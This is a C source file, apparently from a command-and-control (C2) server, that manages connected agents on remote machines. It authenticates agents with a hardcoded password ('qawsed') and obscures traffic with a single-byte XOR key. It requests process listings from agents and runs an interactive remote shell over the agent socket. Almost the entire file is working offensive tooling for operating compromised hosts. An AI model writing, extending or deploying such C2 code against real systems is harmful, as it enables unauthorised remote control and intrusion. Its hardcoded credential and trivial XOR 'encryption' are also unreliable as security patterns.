#include <stdio.h>
#include <string.h>
#include <string.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <fcntl.h>  
#include <errno.h>
#include <termios.h>
#include "c2_modules.h"
#define BUFFER_SIZE 2048
#define TRAFFIC_KEY 0x02

int AuthClient(char *recv_buf){

	// Authenticate client via tokenizing the received buffer
	
	char* token;
	//char* NextToken = NULL;
	char* LastToken = NULL;
	token = strtok(recv_buf, "-");
	// Checks for delimiter
	while (token != NULL) {
		printf("%s\n", token);
		LastToken = token;
		
		// go through other tokens
		token = strtok(NULL, "-");
	}
	
	printf("password string is %s\n", LastToken);
	
	if (strcmp(LastToken,"qawsed") != 0){printf("[x] exiting\n");return -1;}
	printf("[+] AGENT AUTH SUCCESS\n");
	return 0;
}

void decrypt(unsigned char* recv_buf, size_t recv_buf_size) {
	//printf("[+] DECRYPTING with '%c' key\n", key);
	for (int i = 0; i < recv_buf_size; i++) {
		//printf("\\x%02x", magic[i] ^ key);
		recv_buf[i] = recv_buf[i] ^ TRAFFIC_KEY;
	}
	//printf("\n");
	return;
}
void encrypt(unsigned char* recv_buf, size_t recv_buf_size) {
	//printf("[+] DECRYPTING with '%c' key\n", key);
	for (int i = 0; i < recv_buf_size; i++) {
		//printf("\\x%02x", magic[i] ^ key);
		recv_buf[i] = recv_buf[i] ^ TRAFFIC_KEY;
	}
	//printf("\n");
	return;
}

void HandleLspid(char *cmd,int client_socket){

	ssize_t sent_bytes = 0;
	ssize_t bytes_received = 0;
	
	sent_bytes = send(client_socket,cmd,(size_t) strlen(cmd),0);
	if (sent_bytes == -1){
		printf("[x] send() failed\n");
		return;
	}

	char recv_buf[BUFFER_SIZE] = {0};
		
    int done_receiving = 0;
    
    do {
        bytes_received = recv(client_socket, recv_buf, BUFFER_SIZE - 1, 0);
        if (bytes_received < 0) {
            perror("[x] recv() failed\n");
            exit(EXIT_FAILURE);
        }
        
        if (bytes_received > 0) {
            
            decrypt( (unsigned char *)recv_buf,(size_t) bytes_received);
            recv_buf[bytes_received] = '\0'; // Null-terminate
            
            // Check if this chunk contains "done"
            if (strstr(recv_buf, "[DONE]") != NULL) {
                char* done_pos = strstr(recv_buf, "[DONE]");
                *done_pos = '\0'; // Truncate at "done"
                done_receiving = 1;
            }
            
            printf("%s", recv_buf);
        }
        
    } while (!done_receiving && bytes_received > 0);
	return;
}

void HandleShell(char *cmd,int client_socket) {
	
	/*
	ssize_t sent_bytes = 0;
	ssize_t bytes_received = 0;
	
	
	sent_bytes = send(client_socket,cmd,(size_t) strlen(cmd),0);
	if (sent_bytes == -1){
		printf("[x] send() failed\n");
		return;
	}
	

	while (1){

		char recv_buf[BUFFER_SIZE] = {0};
		bytes_received = recv(client_socket, recv_buf, BUFFER_SIZE - 1, 0);
	        if (bytes_received < 0) {
	            perror("[x] recv() failed\n");
	            exit(EXIT_FAILURE);
	        }
	    printf("%s",recv_buf);
	}
 	*/


    ssize_t sent_bytes = 0;
    ssize_t bytes_received = 0;
    
    // Send initial command
    sent_bytes = send(client_socket, cmd, strlen(cmd), 0);
    if (sent_bytes == -1) {
        printf("[x] send() failed\n");
        return;
    }
    int stdin_flags = fcntl(STDIN_FILENO, F_GETFL, 0);
    int sock_flags = fcntl(client_socket, F_GETFL, 0);

    // Set stdin to non-blocking so we can check for user input
    int flags = fcntl(STDIN_FILENO, F_GETFL, 0);
    fcntl(STDIN_FILENO, F_SETFL, flags | O_NONBLOCK);
    
    // Set socket to non-blocking for the select() call
    fcntl(client_socket, F_SETFL, O_NONBLOCK);
    
    while (1) {
        fd_set readfds;
        FD_ZERO(&readfds);
        FD_SET(client_socket, &readfds);
        FD_SET(STDIN_FILENO, &readfds);
        
        // Use select to monitor both socket and stdin
        int max_fd = (client_socket > STDIN_FILENO) ? client_socket : STDIN_FILENO;
        int activity = select(max_fd + 1, &readfds, NULL, NULL, NULL);
        
        if (activity < 0) {
            perror("select error");
            break;
        }
        
        // Check if data is available from the socket (shell output)
        if (FD_ISSET(client_socket, &readfds)) {
            char recv_buf[BUFFER_SIZE] = {0};
            bytes_received = recv(client_socket, recv_buf, BUFFER_SIZE - 1, 0);
            
            if (bytes_received <= 0) {
                // Connection closed or error
                if (bytes_received == 0) {
                    printf("\n[x] Shell disconnected\n");
                } else {
                    perror("[x] recv() failed");
                }
                break;
            }
            
            // Print the shell output
            printf("%.*s", (int)bytes_received, recv_buf);
            fflush(stdout);
        }
        
        // Check if data is available from stdin (user input)
        if (FD_ISSET(STDIN_FILENO, &readfds)) {
            char input_buf[BUFFER_SIZE] = {0};
            ssize_t input_len = read(STDIN_FILENO, input_buf, BUFFER_SIZE - 1);
            
            if (input_len > 0) {
                // Send user input to the shell
            	if (strcmp(input_buf,"exit\n") == 0){
            		sent_bytes = send(client_socket, input_buf, input_len, 0);
                    
                    // Add a small delay to let the exit command be processed
                    // and output be sent back before we break
                    sleep(1);
                    
                    // Clean up and exit
                    fcntl(STDIN_FILENO, F_SETFL, stdin_flags);
                    fcntl(client_socket, F_SETFL, sock_flags);
                    tcflush(STDIN_FILENO, TCIFLUSH);
                    clearerr(stdin);
                    return;
            	}


                sent_bytes = send(client_socket, input_buf, input_len, 0);
                if (sent_bytes == -1) {
                    printf("[x] Failed to send input to shell\n");
                    break;
                }
            }
        }
    }
    
    // Restore original flags
    fcntl(STDIN_FILENO, F_SETFL, flags);


 	return;
 }
